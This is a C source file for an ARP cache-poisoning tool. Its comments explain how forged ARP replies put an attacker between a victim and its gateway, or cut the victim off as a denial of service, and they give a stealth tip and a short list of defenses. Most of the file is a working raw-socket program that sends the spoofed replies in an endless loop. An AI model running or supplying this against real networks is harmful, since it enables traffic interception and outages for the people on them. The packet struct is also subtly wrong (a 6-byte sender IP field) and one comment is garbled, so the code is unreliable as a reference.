// an attack (which is meant to be used legally) to
// legally to position oneself in the middle of
// a connection or to provoke a DoS (legally legal etc)


/*
HOW THIS SHIT WORKS:

The attack benefits from the stateless and
unauthenticated nature of ARP.
As part of the protocol's natural process
someone would broadcast an ARP request and
receive a reply, adding the address obtained
from the reply to a cache table.
The attack simply sends an unsolicited (free)
reply (what the protocol specification allows to receive)
to both the target and the gateway,
leading each to believe they are communicating
with the other; in reality, however, it's the
attacker who is receiving (and sending) all
the traffic between them.
Here lies the distinction between the MITM and DoS
nature of the attack: if the attacker is not performing
forwarding, the gateway and the target will simply
no longer be able to communicate.

ILUSTRATED EXAMPLE:

Attacker:
IP = 10.0.0.5
MAC = AA:AA:AA:AA:AA:AA

Target:
IP = 10.0.0.10

Gateway:
IP = 10.0.0.1

Attacker sends a reply to the target:
"10.0.0.1 is AA:AA:AA:AA:AA:AA"

Attacker sends a reply to the gateway:
"10.0.0.10 is AA:AA:AA:AA:AA:AA"

Now both target and gateway sends
the sadlskd to the attacker

*/

/*
important notes:

- the attack uses broadcast for simplicity,
but unicast is recommended for greater stealth

- some systems DO NOT accept free ARP replies

- active net.ipv4.ip_forward in order to maintain
the MITM, otherwise the attack will function
as a DoS

- when closing (for testing), send replies
with the correct MAC address or force expiration


how to defend yourself:

- dynamic ARP inspection + DHCP snooping
- static ARP cache
- arpwatch maybe

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if_arp.h>

#define ETH_P_ARP 0x0806

struct arp_packet {
	struct ethhdr eth;
	uint16_t htype, ptype;
	uint8_t hlen, plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[6];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};

static void
hex_to_mac(const char* hex, uint8_t* mac)
{
	sscanf(
		hex,
		"%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
		&mac[0], &mac[1], &mac[2], &mac[3],
		&mac[4], &mac[5]
	);
}


// get the MAC address
static int
get_if_mac(const char* iface, uint8_t* mac)
{
	struct ifreq ifr;
	
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	if (fd < 0) {
		return -1;
	}
	
	strncpy(
		ifr.ifr_name,
		iface,
		IFNAMSIZ - 1
	);
	
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		close(fd);
		
		return -1;
	}
	
	memcpy(
		mac,
		ifr.ifr_hwaddr.sa_data,
		6
	);
	
	close(fd);
	
	return 0;
}

static int
get_if_ip(const char* iface, uint8_t* ip)
{
	struct ifreq ifr;
	
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	if (fd < 0) {
		return -1;
	}
	
	strncpy(
		ifr.ifr_name,
		iface,
		IFNAMSIZ - 1
	);
	
	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		close(fd);
		
		return -1;
	}
	
	memcpy(
		ip,
		&((struct sockaddr_in*) &ifr.ifr_addr)->sin_addr,
		4
	);
	
	close(fd);
	
	return 0;
}

static void
send_poison(
	int sockfd,
	struct sockaddr_ll* sa,
	const uint8_t* attacker_mac,
	const char* spoofed_ip,
	const uint8_t* victim_mac,
	const char* victim_ip
)
{
	struct arp_packet pkt;
	uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	
	memset(&pkt, 0, sizeof(pkt));
	memcpy(pkt.eth.h_dest, victim_mac, 6);
	memcpy(pkt.eth.h_source, attacker_mac, 6);
	
	pkt.eth.h_proto = htons(ETH_P_ARP);
	pkt.htype = htons(ARPHRD_ETHER);
	pkt.ptype = htons(ETH_P_IP);
	pkt.hlen = 6;
	pkt.plen = 4;
	pkt.opcode = htons(ARPOP_REPLY);
	
	memcpy(pkt.sender_mac, attacker_mac, 6);
	
	inet_pton(AF_INET, spoofed_ip, pkt.sender_ip);
	
	memcpy(pkt.target_mac, victim_mac, 6);
	
	inet_pton(AF_INET, victim_ip, pkt.target_ip);
	
	sa->sll_halen = 6;
	memcpy(sa->sll_addr, victim_mac, 6);
	
	if (sendto(sockfd, &pkt, sizeof(pkt), 0, (struct sockaddr*) sa, sizeof(*sa)) < 0) {
		perror("sendto");
	}
}

int
main(int argc, char** argv)
{
	if (argc != 4) {
		fprintf(
			stderr,
			"usage: %s <iface> <victim_ip> <gateway_ip>\n"
			"note: if ip_forward is disabled, the attack functions as a DoS\n",
			argv[0]
		);
		
		return 1;
	}
	
	const char* iface = argv[1];
	const char* victim_ip = argv[2];
	const char* gateway_ip = argv[3];
	
	uint8_t attacker_mac[6];
	
	if (get_if_mac(iface, attacker_mac) < 0) {
		perror("get_if_mac");
		
		return 1;
	}
	
	printf("attacker_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
		attacker_mac[0], attacker_mac[1], attacker_mac[2],
		attacker_mac[3], attacker_mac[4], attacker_mac[5]
	);
	
	int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	
	if (sock < 0) {
		perror("socket(AF_PACKET)");
		
		return 1;
	}
	
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = AF_PACKET;
	sa.sll_protocol = htons(ETH_P_ARP);
	sa.sll_ifindex = if_nametoindex(iface);
	
	if (sa.sll_ifindex == 0) {
		perror("if_nametoindex");
		
		return 1;
	}
	
	if (bind(sock, (struct sockaddr*) &sa, sizeof(sa)) < 0) {
		perror("bind");
		
		return 1;
	}
	
	// TARGET MACs: in real scenarios, obtained via ARP request
	// here we accept input via an environment variable for
	// simplicity, or via broadcast.
	// in this example, we use broadcast as the destination
	// (the correct host will still process the reply)
	uint8_t victim_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	
	printf("[*] poisoning: telling to %s that %s is ours (and vice-versa)\n",
		victim_ip,
		gateway_ip
	);
	
	printf("[*] active IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward\n");
	
	while (1) {
		// victim <- gateway
		send_poison(sock, &sa, attacker_mac, gateway_ip, victim_mac, victim_ip);
		
		// gateway <- victim
		send_poison(sock, &sa, attacker_mac, victim_ip, victim_mac, gateway_ip);
		
		printf("[+] sent replies\n");
		sleep(2);
	}
	
	close(sock);
	
	return 0;
}